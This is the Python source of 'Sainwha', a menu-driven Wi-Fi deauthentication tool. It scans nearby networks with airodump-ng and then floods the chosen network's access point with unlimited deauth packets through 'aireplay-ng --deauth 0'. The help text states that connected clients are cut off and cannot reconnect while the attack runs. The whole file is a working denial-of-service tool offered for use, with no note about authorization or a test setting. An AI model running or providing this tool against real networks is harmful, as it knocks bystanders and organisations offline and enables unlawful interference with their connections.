# sainwha by yzee4
#
# MIT License
#
# Copyright (c) 2023 yzee4
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# Code version TER26MAR032024

# Importa as libs necessarias
import os
import csv
import sys
import time
import shutil
import socket
import readline
import threading
import subprocess
# Variaveis de funcionamento
# Variaveis de exibicao e informacao
# INTERFACE: Network Adapter
# network: Network Name
# CHANNEL: Network Channel
# BSSID: Network MAC
# Variaveis de funcionamento
netCards = []
# Retorna tudo a None e false
netCard = None
network = None
channel = None
bssid = None
intHasSet = 'false'
netHasSet = 'false'
# Arquivo temporario
currentFolder = os.getcwd()
tempFolder = currentFolder + "/temp"
if not os.path.exists(tempFolder):
    os.makedirs(tempFolder)
# Definicao de cores
def colors():
    # Nomes das cores de acordo com a formatacao do terminal Linux
    # Se estiver em outro tema, como Kali-Dark ou variantes, as cores podem mudar e nao corresponderem ao nome
    global colorWhite, colorRed, colorGreen, colorBlack, colorSilver
    colorWhite = '\033[0;97m'
    colorRed = '\033[0;91m'
    colorGreen = '\033[0;92m'
    colorBlack = '\033[0;90m'
    colorSilver = '\033[0;89m'
colors()
# Verifica se usuario esta em modo root
if os.geteuid() == 0:
    pass
else:
    print(f"{colorRed} > {colorWhite}Execute as root!")
    sys.exit()
# Verifica se as ferramentas necessarias estao instaladas
def check_tools(toolName):
    if toolName == 'net-tools':
        return os.path.exists('/sbin/ifconfig')
    else:
        return shutil.which(toolName) is not None
subprocess.call('clear')
toolsCheck = ['aircrack-ng']
notInstalled = []
for tool in toolsCheck:
    if not check_tools(tool):
        notInstalled.append(tool)
if notInstalled:
    for tool in notInstalled:
        print(f"{colorRed} > {colorBlack}{tool} {colorWhite}not installed. To install, use '{colorGreen}sudo apt install {tool}{colorWhite}'.")
        sys.exit()
# Verifica se o usuario esta conectado a internet
def check_network_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    return False
if check_network_connection():
    subprocess.run("clear")
    print(f"{colorRed} > {colorWhite}Please start sainwha without {colorBlack}being connected to a internet{colorWhite}.")
    sys.exit()
else:
    abortProgram = False
# Verifica se o usuario se conectou a internet
def check_internet():
    while not abortProgram:
        try:
            subprocess.run(["ping", "-c", "1", "google.com"], 
                           stdout=subprocess.PIPE, 
                           stderr=subprocess.PIPE, 
                           check=True)
        except subprocess.CalledProcessError:
            pass 
        else:
            subprocess.run("clear")
            print(f"{colorRed} > {colorWhite}{colorBlack}Do not activate the internet {colorWhite}while using sainwha.") 
            os._exit(0)
        time.sleep(0.1) 
internetThread = threading.Thread(target=check_internet)
internetThread.start()
# Comandos do subprocess
def write_net(netCardProcess, scanTimeProcess):
    print(f"{colorGreen} > {colorWhite}Scanning... please wait for '{colorGreen}{scanTimeProcess}{colorWhite}' seconds")
    writeNetProcess = subprocess.Popen(
        f"airodump-ng -w {tempFolder}/netList --write-interval 1 --output-format csv {netCardProcess}", 
        shell=True, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        stdin=subprocess.PIPE)
    time.sleep(scanTimeProcess)
    writeNetProcess.terminate()
    writeNetProcess.wait()
def attack_net(netCardProcess):
    # Define a rota ate a colorRede
    global network, bssid, channel
    print(f"\n{colorGreen} > {colorWhite}Starting attack on '{colorGreen}{network}{colorWhite}' channel '{colorGreen}{channel}{colorWhite}'...")
    airodumpProcess = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} {netCard} > /dev/null 2>&1", shell=True)
    time.sleep(0.5)
    os.kill(airodumpProcess.pid, 2)
    # Inicia o envio de pacotes
    print(f"{colorBlack} > {colorWhite}Attack started. Press '{colorGreen}Ctrl+C{colorWhite}' to stop")
    subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {netCardProcess} > /dev/null 2>&1", shell=True)
    print(f"{colorRed} > {colorWhite}Unknown error{colorWhite}")
    os._exit(1)
def remove_temp_folder():
    netListFile = "netList-01.csv"
    fileRemove = os.path.join(tempFolder, netListFile)
    if os.path.exists(fileRemove):
        os.remove(fileRemove)
remove_temp_folder()
# Definir o interface
# Exibe uma lista de interface para o usuario escolher                
def set_network_card():
    # Escaneia os interfaces disponiveis
    try:
        result = subprocess.check_output(["iw", "dev"])
        resultString = result.decode("utf-8")
        lines = resultString.split("\n")
        for line in lines:
            if "Interface" in line:
                cardName = line.replace("Interface", "").strip()
                netCards.append(cardName)
    except subprocess.CalledProcessError:
        print(f"{colorRed} > {colorWhite}'iw dev' not executed")
        print()
    # Exibe as informacoes na tela
    # O usuario ira escolher o interface
    if not netCards:
        print(f"{colorRed} > {colorWhite}No network adapters available\n")
    for card in netCards:
        print(f"{colorGreen} > {colorWhite}Availables interfaces:")
        print(f"{colorGreen} . {colorWhite}{card}\n")
    try:
        while True:
            try:
                changeInterface = input(f"{colorBlack} > {colorWhite}Set interface > ")
            except KeyboardInterrupt:
                print(f"\n {colorRed}> {colorWhite}Interface has not set\n")
                main()
            if changeInterface in netCards:
                global intHasSet
                intHasSet = 'true'
                global netCard
                netCard = changeInterface
                print(f"{colorGreen} > {colorWhite}interface set to '{colorGreen}{netCard}{colorWhite}'\n")
                main()
                break
            else:
                print(f"{colorRed} > '{colorBlack}{changeInterface}{colorWhite}' Does not match a valid interface\n")
    except KeyboardInterrupt:
        print('\n')
        main()
# Definir o network
# Exibe uma lista de network (colorRedes) para o usuario escolher        
def set_network_to_attack():
    if intHasSet == 'true':
        try:
            # Define o tempo que o escaneamento de colorRede sera feito
            def scan_time():
                try:
                    while True:
                        try:
                            changeTime = input(f"{colorBlack} > {colorWhite}Set scanning time (in seconds) > ")
                        except KeyboardInterrupt:
                            print(f"\n {colorRed}> {colorWhite}Network has not set\n")
                            main()
                        if changeTime.isdigit():
                            global scanTime
                            scanTime = float(changeTime)
                            break
                        else:
                            print(f"{colorRed} > {colorWhite}Enter a number!\n")
                except KeyboardInterrupt:
                    print('\n\n')
                    main()
            scan_time()
            # Escaneia as colorRedes proximas e exibe as informacoes
            # Informacoes gravadas no arquivo temporario
            write_net(netCard, scanTime)
            global netData, netList
            netData = []
            netList = []
            # Le as informacoes do arquivo temporario e grava nas variaveis correspondentes
            try:
                with open(f"{tempFolder}/netList-01.csv") as tempFile:
                    csvFile = csv.reader(tempFile)
                    for line in csvFile:
                        if len(line) >= 15 and line[0].strip() != 'BSSID':
                            viewBSSID = line[0].strip()
                            viewNETWORK = line[13].strip()
                            viewCHANNEL = line[3].strip()
                            if viewNETWORK:
                                netData.append((viewBSSID, viewNETWORK, viewCHANNEL))
                                netList.append(viewNETWORK)
                                remove_temp_folder()
            except FileNotFoundError:
                print(f"{colorRed} > {colorWhite}File not found\n")
                main()
            # Exibe as informacoes na tela    
            if netData:
                print(f"\n{colorGreen} > {colorWhite}Available networks:")
                for viewBSSID, viewNETWORK, viewCHANNEL in netData:
                    print(f"{colorGreen} . {colorWhite}{viewNETWORK}")
                print()
            else:
                print(f"{colorRed} > {colorWhite}Networks not found\n")
                main()
            # Definir o network
            while True:
                try:
                    try:
                        changeNet = input(f"{colorBlack} > {colorWhite}Set network > ")
                    except KeyboardInterrupt:
                        print(f"\n {colorRed}> {colorWhite}Network has not set\n")
                        main()
                    if changeNet in netList:
                        for chosedBSSID, chosedNETWORK, chosedCHANNEL in netData:
                            if chosedNETWORK == changeNet:
                                global network, bssid, channel
                                network = chosedNETWORK
                                channel = chosedCHANNEL
                                bssid = chosedBSSID
                                print(f"{colorGreen} > {colorWhite}NETWORK set to '{colorGreen}{network}{colorWhite}'")
                                print(f"{colorGreen} > {colorWhite}CHANNEL set to '{colorGreen}{channel}{colorWhite}'")
                                print(f"{colorGreen} > {colorWhite}MAC set to '{colorGreen}{bssid}{colorWhite}'\n")
                                global netHasSet
                                netHasSet = 'true'
                        break
                    else:
                        print(f"{colorRed} > '{colorBlack}{changeNet}{colorWhite}' Does not match a valid network\n")
                except KeyboardInterrupt:
                    print('\n')
                    main()
        except KeyboardInterrupt:
            print('\n\n')
            main()
    else:
        print(f"{colorRed} > {colorWhite}Interface has not set. Use '{colorGreen}set interface{colorWhite}'\n")
# Iniciar o ataque
# Processo de envio de pacotes de desautentificacao
def start_attack():
    if netHasSet == 'true':
        try:            
            attack_net(netCard)
        except KeyboardInterrupt:
            print(f"{colorGreen} > {colorWhite}Attack interrupted!\n")
            main()
    else:
        print(f"{colorRed} > {colorWhite}Network has not set. Use '{colorGreen}set network{colorWhite}'\n")
start_attack()
# Exibe as opcoes
# Aqui exibe as informacoes que precisam ser definidas e as que ja estao definidas
def options():
    print(f"""{colorBlack} > {colorWhite}Sainwha options:

INTERFACE: {colorGreen}{netCard}{colorWhite}

NETWORK: {colorGreen}{network}{colorWhite}\tCHANNEL: {colorGreen}{channel}{colorWhite}\tMAC: {colorGreen}{bssid}{colorWhite}

{colorBlack} > {colorWhite}To set INTERFACE, use '{colorGreen}set interface{colorWhite}', to set NETWORK, use '{colorGreen}set network{colorWhite}'
""")
def help():
    print(f"""{colorBlack} > {colorWhite}Sainwha help menu:
          
{colorBlack} > {colorWhite}Commands:
    {colorBlack}set{colorWhite}    {colorGreen}interface{colorWhite}    or{colorWhite}    {colorGreen}int{colorWhite}    set a interface to scans
    {colorBlack}set{colorWhite}    {colorGreen}network{colorWhite}      or{colorWhite}    {colorGreen}net{colorWhite}    set a network that will be scans
    {colorGreen}start{colorWhite}                            {colorWhite}start sending deauth packets

    {colorBlack}> {colorWhite}Other:
       {colorGreen}options{colorWhite}    or{colorWhite}    {colorGreen}opt{colorWhite}          show all options to set
       {colorGreen}help{colorWhite}       or{colorWhite}    {colorGreen}h{colorWhite}            show this help menu
       {colorGreen}clear{colorWhite}      or{colorWhite}    {colorGreen}cls{colorWhite}          clear terminal

 {colorGreen}How it works is simple, the program sends deauthentication{colorWhite}
 {colorGreen}packets to the network. Connected clients are deauthenticated and{colorWhite} 
 {colorGreen}cannot be reconnected unless the attack is stopped{colorWhite}
      
""")
# Interface sainwhaS  
def interface_variables():
    global menuInterface
    menuInterface = (f"""{colorWhite}Sainwha - {colorGreen}Deauther{colorWhite} Attacker
{colorBlack}-|{colorWhite} GitHub {colorGreen}https://github.com/yzee4/Sainwha{colorWhite}
                                                 
{colorBlack}           █████               ███               
 {colorBlack}      █████████████           █████            
 {colorBlack}S    ██████{colorSilver}██████{colorBlack}█████        ███████          
     █████████{colorSilver}███████{colorBlack}██        ██████████       
 {colorBlack}A    ███████{colorSilver}█████{colorBlack}███████        ██████████     
    █  ████████████████████     █████████       
 {colorBlack}I  ███  ██████  ████████████████████           
 {colorBlack}   █████      ████████████████████             
 {colorBlack}N   ██████████████████████████████             
      █{colorWhite}███████{colorBlack}████████████████████              
 {colorWhite}W{colorBlack}      {colorWhite}████████{colorBlack}█  {colorBlack}█████    {colorWhite}████{colorBlack}█               
 {colorBlack}         {colorWhite}███████{colorBlack}  ██████ {colorWhite}█████{colorBlack}                 
 {colorWhite}H{colorBlack}       █   {colorWhite}████{colorBlack}  ██████  {colorWhite}█{colorBlack}                    
 {colorBlack}       █████      {colorBlack}██████                       
 {colorWhite}A{colorBlack}                  █████                       
                    ████                        
 {colorWhite}coded by yzee4{colorBlack}     ███      {colorGreen}>{colorWhite} Linux theme{colorBlack}

{colorWhite}To see options, use '{colorGreen}options{colorWhite}'
""")
interface_variables()
# Exibe a interface
def show_interface():
    subprocess.call('clear')
    print(f'''{menuInterface}{colorWhite}''') 
show_interface()
# Menu de definicoes
def main():
    try:
        while True:
            userSelect = input(f"{colorWhite}Sainwha{colorWhite} > ").strip()
            # Definir o interface
            # Inicia o processo de definicao do interface (Network Adapter)
            if userSelect == "set interface" or userSelect == "set int" or userSelect == "interface" or userSelect == "int":
                set_network_card()
            # Definir o network
            # Inicia o processo de definicao do interface (Network Name)
            elif userSelect == "set network" or userSelect == "set net" or userSelect == "network" or userSelect == "net":
                set_network_to_attack()
            # Inica o ataque
            # Inicia o processo de envio de pacotes de desautenticacao            
            elif userSelect == "start":
                start_attack()
            # Exibe o menu de opcoes
            elif userSelect == "options" or userSelect == "opt":
                options()
            # Exibe o menu de ajuda
            elif userSelect == "help" or userSelect == "h":
                help()
            # Limpa o console
            elif userSelect == "clear" or userSelect == "cls":
                subprocess.run("clear")
                show_interface()
                main()
            # Caso o comando usado nao seja reconhecido, exibe o erro
            else:
                print(f"{colorRed} > {colorWhite}Unknown command: {userSelect}\n")
    # Sair do programa
    except KeyboardInterrupt:
        print(f"\n{colorWhite}Copyright (c) 2023 yzee4")
        os._exit(0)
main()
